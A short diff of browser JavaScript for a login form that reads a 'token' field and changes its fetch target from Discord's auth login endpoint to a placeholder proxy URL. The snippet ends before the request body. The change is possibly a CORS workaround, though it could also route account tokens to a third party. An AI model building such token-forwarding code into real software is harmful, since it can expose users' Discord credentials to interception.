@@ -1,7 +1,7 @@
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
     const token = document.getElementById('token').value;
-    fetch('https://discord.com/api/v9/auth/login', {
+    fetch('https://your-proxy-server-url/proxy', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
